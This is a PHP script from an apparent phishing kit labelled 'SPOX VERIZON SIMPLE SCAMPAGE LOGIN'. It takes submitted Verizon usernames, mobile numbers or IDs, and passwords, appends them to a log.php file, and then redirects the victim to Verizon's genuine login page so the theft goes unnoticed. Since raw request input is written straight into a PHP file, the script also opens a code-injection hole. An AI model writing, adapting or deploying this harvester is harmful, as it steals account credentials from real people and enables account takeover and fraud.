<?php
    extract($_REQUEST);
    $file=fopen("log.php","a");

    fwrite($file,"👇------------SPOX VERIZON SIMPLE SCAMPAGE LOGIN------------ 👇");
    fwrite($file, $username ."\n");
    fwrite($file,"Mob Num/Verizon ID   :");
    fwrite($file, $email ."\n");
    fwrite($file,"Password   :");
    fwrite($file, $password ."\n");
	
    fclose($file);
    header("location: index.php");

    header('Location:https://secure.verizon.com/vzauth/UI/Login ');
 ?>
